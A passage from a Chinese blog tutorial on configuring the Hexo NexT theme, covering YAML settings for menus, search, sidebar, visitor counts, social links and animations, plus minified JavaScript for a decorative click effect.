<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: 木He寸&amp;eonun&#39;s Blog			#标题</span><br><span class="line">subtitle: 记录积累方有成长		#副标题</span><br><span class="line">description: 你只需努力，其他任由天意！	#描述</span><br><span class="line">keywords:</span><br><span class="line">author: 木He寸&amp;eonun		#作者</span><br><span class="line">language: zh-CN		 #语言</span><br><span class="line">timezone: Asia&#x2F;Shanghai		#时区</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">url: https:&#x2F;&#x2F;eonun.com		#域名</span><br><span class="line"></span><br><span class="line"># Directory</span><br><span class="line">skip_render: README.md 	# 部署的时候不包含的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="next主题主配置文件基础配置"><a href="#next主题主配置文件基础配置" class="headerlink" title="next主题主配置文件基础配置"></a>next主题主配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml</span><br></pre></td></tr></table></figure>
<h3 id="主题样式配置"><a href="#主题样式配置" class="headerlink" title="主题样式配置"></a>主题样式配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes	#选择一个主题样式，去掉前面的注释，将不用的主题样式注释掉</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>
<h3 id="菜单栏配置"><a href="#菜单栏配置" class="headerlink" title="菜单栏配置"></a>菜单栏配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span>	<span class="comment">#将需要的菜单取消注释即可，顺便换一下顺序</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-heartbeat</span></span><br></pre></td></tr></table></figure>
<p><a href="https://link.jianshu.com/?t=http%3A%2F%2Ffontawesome.io%2Ficons%2F">Font Awesome</a></p>
<h3 id="添加模块"><a href="#添加模块" class="headerlink" title="添加模块"></a>添加模块</h3><ul>
<li><strong>分类模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page categories</span><br><span class="line">vim <span class="built_in">source</span>/categories/index.md	<span class="comment">#修改</span></span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-07-19 13:04:16</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>给文章在顶部添加<code>categories</code>字段，即可自动创建分类名并加入对应的分类中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="section">#单个分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: 分类名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">#有子分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: [1级分类,2级分类,3级分类,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: </span><br><span class="line"><span class="bullet">-</span> 1级分类</span><br><span class="line"><span class="bullet">-</span> 2级分类</span><br><span class="line"><span class="bullet">-</span> 3级分类</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>标签模块</strong></li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">hexo n page <span class="keyword">tags</span></span><br><span class="line"><span class="keyword">vim</span> <span class="keyword">source</span>/<span class="keyword">tags</span>/<span class="built_in">index</span>.md	#comment<span class="variable">s:false</span>是关闭评论</span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-07-19 13:04:24</span><br><span class="line">type: tags</span><br><span class="line">comments:false</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>给文章在顶部添加<code>tags</code>字段，即可自动创建标签名并归入对应的标签中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">title: 这是文章标题</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> 标签1</span><br><span class="line"><span class="bullet">-</span> 标签2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关于模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page about</span><br></pre></td></tr></table></figure>
<p>生成<code>source/about/index.md</code>，打开<code>index.md</code>文件即可编辑个人相关信息</p>
<ul>
<li><strong>本地搜索模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-searchdb	<span class="comment">#安装搜索插件</span></span><br><span class="line">vim _config.yml	<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在Extensions下添加搜索配置模块</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启搜索模块</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>	<span class="comment"># auto 通过输入触发， manual 通过回车键触发</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span>	<span class="comment">#设置显示每篇文章前n个结果， -1 为全部结果</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span>	<span class="comment">#Unescape html字符串到可读的字符串</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>全文阅读</strong></li>
</ul>
<p>博客主页会有多篇文章，如果想让你的文章只显示一部分，多余内容需要点击阅读全文来查看，那么就需要在的文章中添加：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--more--&gt;</span></span><br></pre></td></tr></table></figure>
<p>在它后面的内容会被隐藏，当点击阅读全文才能看到<br>可将其添加到模板文件(<code>scaffolds/post.md</code>) 中，每次创建新文章都自动添加</p>
<h2 id="头像图标"><a href="#头像图标" class="headerlink" title="头像图标"></a>头像图标</h2><p>将头像图标文件放到 <code>$blog/source/images</code> 下</p>
<h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/me.png</span>	<span class="comment">#头像路径</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>	<span class="comment">#头像是否为圆形显示</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span>	<span class="comment">#鼠标到头像上是否旋转头像</span></span><br></pre></td></tr></table></figure>
<h3 id="博客网站图标"><a href="#博客网站图标" class="headerlink" title="博客网站图标"></a>博客网站图标</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/logo-16px.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/logo-32px.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.png</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>
<h2 id="侧栏配置"><a href="#侧栏配置" class="headerlink" title="侧栏配置"></a>侧栏配置</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position, available values: left | right (only for Pisces | Gemini).</span></span><br><span class="line">  <span class="comment">#边栏位置（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span>	<span class="comment">#左边</span></span><br><span class="line">  <span class="comment">#position: right	#右边</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Manual define the sidebar width. If commented, will be default for:</span></span><br><span class="line">  <span class="comment"># Muse | Mist: 320</span></span><br><span class="line">  <span class="comment"># Pisces | Gemini: 240</span></span><br><span class="line">  <span class="comment">#width: 300	#侧栏宽度，注释就用默认值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display, available values (only for Muse | Mist):</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  				<span class="comment">#在文章页面（拥有目录列表）时显示</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都显示</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  				<span class="comment">#在所有页面中都隐藏（可以手动展开）</span></span><br><span class="line">  <span class="comment">#  - remove  totally remove sidebar including sidebar toggle.</span></span><br><span class="line">  				<span class="comment">#完全移除</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span>	<span class="comment">#侧栏显示时机（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="attr">offset:</span> <span class="number">12</span>	<span class="comment">#文章间距（只作用于 Pisces 和 Gemini 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">false</span>	<span class="comment">#在窄视图上启用侧栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">dimmer:</span> <span class="literal">false</span>		<span class="comment">#单击任何页面的空白部分关闭栏（只作用于 Muse 和 Mist 样式）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">back2top:</span>	<span class="comment">#返回顶部</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span>	<span class="comment">#将回到顶部按钮放到侧边栏</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span>	<span class="comment">#在回到顶部按钮上显示百分百</span></span><br></pre></td></tr></table></figure>
<h2 id="访问计数"><a href="#访问计数" class="headerlink" title="访问计数"></a>访问计数</h2><p>用的是<a href="http://busuanzi.ibruce.info/">不蒜子脚本</a>来达到计数目的的</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show Views / Visitors of the website / page with busuanzi.</span></span><br><span class="line"><span class="comment"># Get more information on http://ibruce.info/2015/04/04/busuanzi</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>		<span class="comment">#开启不蒜子计数</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">eye</span></span><br></pre></td></tr></table></figure>
<p>若显示出错可到不蒜子官网查询到<a href="http://ibruce.info/2015/04/04/busuanzi">最新脚本变化</a><br>在本地查看的变量是错误, <code>hexo c</code> ,<code>hexo d</code>之后打开网页,就能看到正确的访问人数</p>
<h2 id="侧边栏目录"><a href="#侧边栏目录" class="headerlink" title="侧边栏目录"></a>侧边栏目录</h2><p>在写文章是通常会有给标题编号的情况，但主题默认也会给加上一个编号，这样就会有些多余，关闭自动编号只需在侧边栏目录配置关闭即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Table Of Contents in the Sidebar	#边栏中的目录</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">	</span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span>	<span class="comment">#自动将列表编号添加到toc	修改为false就不会自动标号了</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span>	<span class="comment">#如果为true，如果标题宽度大于侧边栏宽度，则所有单词将放在下一行。</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span>	<span class="comment">#如果为true，将显示帖子中的所有TOC级别，而不是其中的已激活部分</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span>	<span class="comment">#生成的toc的最大航向深度。可以通过Front-matter中的`toc_max_depth`在一个帖子中设置它</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏社交链接"><a href="#侧边栏社交链接" class="headerlink" title="侧边栏社交链接"></a>侧边栏社交链接</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/eonun</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:eonun47@gmail.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="attr">Weibo:</span> <span class="string">https://weibo.com/eonun</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="attr">Twitter:</span> <span class="string">https://twitter.com/eonun</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-twitter</span></span><br><span class="line">  <span class="comment">#FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line">  <span class="comment">#StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="comment">#Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏友情链接"><a href="#侧边栏友情链接" class="headerlink" title="侧边栏友情链接"></a>侧边栏友情链接</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_icon:</span> <span class="string">link</span></span><br><span class="line"><span class="attr">links_title:</span> <span class="string">友链</span></span><br><span class="line"><span class="attr">links_layout:</span> <span class="string">block</span></span><br><span class="line"><span class="comment">#links_layout: inline</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="string">Web前端导航:</span> <span class="string">http://www.alloyteam.com/nav/</span></span><br><span class="line">  <span class="string">创造狮导航:</span> <span class="string">http://www.chuangzaoshi.com/code</span></span><br><span class="line">  <span class="string">前端书籍资料:</span> <span class="string">http://www.36zhen.com/t?id=3448</span></span><br></pre></td></tr></table></figure>
<h2 id="文章版权信息"><a href="#文章版权信息" class="headerlink" title="文章版权信息"></a>文章版权信息</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>
<h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use velocity to animate everything.</span></span><br><span class="line"><span class="attr">motion:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启动画</span></span><br><span class="line">  <span class="attr">async:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h3 id="动画背景"><a href="#动画背景" class="headerlink" title="动画背景"></a>动画背景</h3><p>克隆脚本到<code>themes/next/source/lib/three</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-three themes/next/<span class="built_in">source</span>/lib/three</span><br></pre></td></tr></table></figure>
<p>修改主题配置文件开启动态背景:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JavaScript 3D library.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-three</span></span><br><span class="line"><span class="attr">three:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">three_waves:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">canvas_sphere:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CDN 加速 找到相应行去掉注释即可启用</span></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">three:</span> <span class="string">//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js</span></span><br><span class="line">  <span class="attr">three_waves:</span> <span class="string">//cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js</span></span><br><span class="line">  <span class="comment"># canvas_lines: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_lines.min.js</span></span><br><span class="line">  <span class="comment"># canvas_sphere: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_sphere.min.js</span></span><br></pre></td></tr></table></figure>
<h3 id="顶部加载进度条"><a href="#顶部加载进度条" class="headerlink" title="顶部加载进度条"></a>顶部加载进度条</h3><p>克隆脚本到<code>themes/next/source/lib/pace</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-pace themes/next/<span class="built_in">source</span>/lib/pace</span><br></pre></td></tr></table></figure>
<p>修改主题配置文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pace:</span><br><span class="line">  enable: true</span><br><span class="line">  # Themes list:</span><br><span class="line">  # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | ce</span><br><span class="line">nter-simple</span><br><span class="line">  # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material |</span><br><span class="line"> minimal</span><br><span class="line">  theme: minimal</span><br><span class="line"></span><br><span class="line"># CDN 加速 找到相应行去掉注释即可启用</span><br><span class="line">vendors:</span><br><span class="line"></span><br><span class="line">  pace: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1&#x2F;pace.min.js</span><br><span class="line">  pace_css: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1&#x2F;themes&#x2F;blue&#x2F;pace-theme-minimal.css</span><br></pre></td></tr></table></figure>
<h2 id="添加打赏"><a href="#添加打赏" class="headerlink" title="添加打赏"></a>添加打赏</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reward (Donate)</span></span><br><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="comment"># 如果为true，则默认情况下会在每篇文章中显示奖励</span></span><br><span class="line">  <span class="comment"># 可以通过&quot; reward：true | false”在特定文章中显示或隐藏奖励</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#comment: Donate comment here		#在这里发表评论</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="comment">#wechatpay: /images/wechatpay.png		#微信收款码</span></span><br><span class="line">  <span class="comment">#alipay: /images/alipay.png			#支付宝收款码</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png			#比特币收款</span></span><br></pre></td></tr></table></figure>
<h2 id="底部博客平台信息"><a href="#底部博客平台信息" class="headerlink" title="底部博客平台信息"></a>底部博客平台信息</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h1 id="自定义主题内容"><a href="#自定义主题内容" class="headerlink" title="自定义主题内容"></a>自定义主题内容</h1><h2 id="底部标签图标样式"><a href="#底部标签图标样式" class="headerlink" title="底部标签图标样式"></a>底部标签图标样式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig</span><br></pre></td></tr></table></figure>
<p>将<code>rel=&quot;tag&quot;&gt;&#123;&#123; tag_indicate &#125;&#125;</code>改为：<code>rel=&quot;tag&quot;&gt;&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel&#x3D;&quot;tag&quot;&gt;&lt;i class&#x3D;&quot;fa fa-tag&quot;&gt;&lt;&#x2F;i&gt; &#123;&#123; tag.name &#125;&#125;&lt;&#x2F;a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h2><p>第一种(小心心)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/clicklove.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">&quot;left:&quot;</span>+d[e].x+<span class="string">&quot;px;top:&quot;</span>+d[e].y+<span class="string">&quot;px;opacity:&quot;</span>+d[e].alpha+<span class="string">&quot;;transform:scale(&quot;</span>+d[e].scale+<span class="string">&quot;,&quot;</span>+d[e].scale+<span class="string">&quot;) rotate(45deg);background:&quot;</span>+d[e].color+<span class="string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">&quot;function&quot;</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;div&quot;</span>);a.className=<span class="string">&quot;heart&quot;</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX-<span class="number">5</span>,<span class="attr">y</span>:e.clientY-<span class="number">5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;style&quot;</span>);a.type=<span class="string">&quot;text/css&quot;</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">&quot;rgb(&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;)&quot;</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">setTimeout</span>(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#body标签中添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;clicklove.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>另一种特效(烟花)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/fireworks.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span 